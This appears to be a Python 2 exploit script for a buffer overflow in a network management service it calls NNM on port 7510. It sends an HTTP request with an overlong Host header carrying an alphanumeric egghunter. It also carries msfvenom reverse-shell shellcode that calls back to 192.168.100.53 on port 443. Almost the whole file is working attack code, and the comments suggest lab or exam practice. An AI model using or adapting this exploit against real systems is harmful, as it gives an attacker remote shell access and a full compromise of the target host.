#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
import os
import sys

egghunter=(
"\x25\x4A\x4D\x4E\x55"
"\x25\x35\x32\x31\x2A"
"\x54\x58"

"\x2D\x66\x4D\x55\x55"
"\x2D\x66\x4B\x55\x55"
"\x2D\x6A\x50\x55\x55"
"\x50"
"\x5C" 
"\x41\x41"  # Are these needed?

"\x25\x4A\x4D\x4E\x55"
"\x25\x35\x32\x31\x2A"
"\x2D\x21\x55\x55\x55"
"\x2D\x21\x54\x55\x55"
"\x2D\x49\x6F\x55\x6D"
"\x50"
"\x41\x41" # Are these bytes necessary?

"\x25\x4A\x4D\x4E\x55" 
"\x25\x35\x32\x31\x2A"
"\x2D\x71\x21\x61\x75"
"\x2D\x71\x21\x61\x75"
"\x2D\x6F\x47\x53\x65"
"\x50"

"\x41\x41" #??
"\x25\x4A\x4D\x4E\x55"
"\x25\x35\x32\x31\x2A"
"\x2D\x44\x41\x7E\x58"
"\x2D\x44\x34\x7E\x58"
"\x2D\x48\x33\x78\x54" 
"\x50"
"\x41\x41"

"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x71\x7A" 
"\x31\x45\x2D\x31\x7A\x31\x45\x2D\x6F\x52\x48\x45\x50\x41\x41\x25" 
"\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x33\x73\x31\x2D\x2D\x33" 
"\x33\x31\x2D\x2D\x5E\x54\x43\x31\x50\x41\x41\x25\x4A\x4D\x4E\x55" 
"\x25\x35\x32\x31\x2A\x2D\x45\x31\x77\x45\x2D\x45\x31\x47\x45\x2D" 
"\x74\x45\x74\x46\x50\x41\x41\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31" 
"\x2A\x2D\x52\x32\x32\x32\x2D\x31\x31\x31\x31\x2D\x6E\x5A\x4A\x32" 
"\x50\x41\x41\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x31\x2D" 
"\x77\x44\x2D\x31\x2D\x77\x44\x2D\x38\x24\x47\x77\x50")

# msfvenom -p windows/shell_reverse_tcp -v shell -f python LHOST=192.168.100.53 LPORT=443 -e x86/shikata_ga_nai -b "\x00"
#Payload size: 351 bytes
#Added nop at beginning to make shellcode divisible by 4
shell =  ""
shell += "\x90\xbf\x22\x88\x76\xcc\xda\xd0\xd9\x74\x24\xf4\x58\x31"
shell += "\xc9\xb1\x52\x31\x78\x12\x83\xc0\x04\x03\x5a\x86\x94"
shell += "\x39\x66\x7e\xda\xc2\x96\x7f\xbb\x4b\x73\x4e\xfb\x28"
shell += "\xf0\xe1\xcb\x3b\x54\x0e\xa7\x6e\x4c\x85\xc5\xa6\x63"
shell += "\x2e\x63\x91\x4a\xaf\xd8\xe1\xcd\x33\x23\x36\x2d\x0d"
shell += "\xec\x4b\x2c\x4a\x11\xa1\x7c\x03\x5d\x14\x90\x20\x2b"
shell += "\xa5\x1b\x7a\xbd\xad\xf8\xcb\xbc\x9c\xaf\x40\xe7\x3e"
shell += "\x4e\x84\x93\x76\x48\xc9\x9e\xc1\xe3\x39\x54\xd0\x25"
shell += "\x70\x95\x7f\x08\xbc\x64\x81\x4d\x7b\x97\xf4\xa7\x7f"
shell += "\x2a\x0f\x7c\xfd\xf0\x9a\x66\xa5\x73\x3c\x42\x57\x57"
shell += "\xdb\x01\x5b\x1c\xaf\x4d\x78\xa3\x7c\xe6\x84\x28\x83"
shell += "\x28\x0d\x6a\xa0\xec\x55\x28\xc9\xb5\x33\x9f\xf6\xa5"
shell += "\x9b\x40\x53\xae\x36\x94\xee\xed\x5e\x59\xc3\x0d\x9f"
shell += "\xf5\x54\x7e\xad\x5a\xcf\xe8\x9d\x13\xc9\xef\xe2\x09"
shell += "\xad\x7f\x1d\xb2\xce\x56\xda\xe6\x9e\xc0\xcb\x86\x74"
shell += "\x10\xf3\x52\xda\x40\x5b\x0d\x9b\x30\x1b\xfd\x73\x5a"
shell += "\x94\x22\x63\x65\x7e\x4b\x0e\x9c\xe9\xb4\x67\xfa\xdc"
shell += "\x5c\x7a\x02\x1e\x26\xf3\xe4\x4a\x48\x52\xbf\xe2\xf1"
shell += "\xff\x4b\x92\xfe\xd5\x36\x94\x75\xda\xc7\x5b\x7e\x97"
shell += "\xdb\x0c\x8e\xe2\x81\x9b\x91\xd8\xad\x40\x03\x87\x2d"
shell += "\x0e\x38\x10\x7a\x47\x8e\x69\xee\x75\xa9\xc3\x0c\x84"
shell += "\x2f\x2b\x94\x53\x8c\xb2\x15\x11\xa8\x90\x05\xef\x31"
shell += "\x9d\x71\xbf\x67\x4b\x2f\x79\xde\x3d\x99\xd3\x8d\x97"
shell += "\x4d\xa5\xfd\x27\x0b\xaa\x2b\xde\xf3\x1b\x82\xa7\x0c"
shell += "\x93\x42\x20\x75\xc9\xf2\xcf\xac\x49\x02\x9a\xec\xf8"
shell += "\x8b\x43\x65\xb9\xd1\x73\x50\xfe\xef\xf7\x50\x7f\x14"
shell += "\xe7\x11\x7a\x50\xaf\xca\xf6\xc9\x5a\xec\xa5\xea\x4e"
shell += "\xcc" * 500

#offset match at 3381
#rubbish = "\x41" * 3377 +"\x4c\x4c\x77\x21" + "\x2b\x46\x35\x6d" + "\x43"*29
#rubbish+= egghunter + "\x41" * (360 - len(egghunter)) + ":7510"
rubbish = "\x4c"*3379 + "\x4c\x4c\x77\x21\x2b\x46\x35\x6d" + "G"*32 + egghunter + "A"*100 + ":7510"

buffer="GET /topology/homeBaseView HTTP/1.1\r\n"
buffer+="Host: " + rubbish + "\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="User-Agent:"+ shell+ "\r\n"
buffer+="Content-Length: 1048580\r\n\r\n"
#buffer+="T00WT00W" + "\xcc" * 1242
buffer+=shell

print "[*] Sending das evil request to NNM"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.100.176",7510))
s.send(buffer)
s.close()
